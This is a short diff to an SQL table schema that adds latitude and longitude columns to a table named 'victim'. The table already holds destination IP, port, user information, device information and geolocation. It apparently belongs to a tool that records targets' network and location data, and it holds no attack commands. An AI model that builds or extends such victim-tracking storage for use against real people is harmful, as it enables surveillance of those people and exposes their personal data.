@@ -15,6 +15,8 @@ CREATE TABLE IF NOT EXISTS victim (
     id INT AUTO_INCREMENT PRIMARY KEY,
     DestinationIP VARCHAR(255) NOT NULL,
     DestinationPort INT NOT NULL,
+    DestinationLatitude VARCHAR(255),
+    DestinationLongitude VARCHAR(255),
     UserInfo VARCHAR(255) NOT NULL,
     DeviceInfo VARCHAR(255),
     GeoLocation VARCHAR(255) NOT NULL,
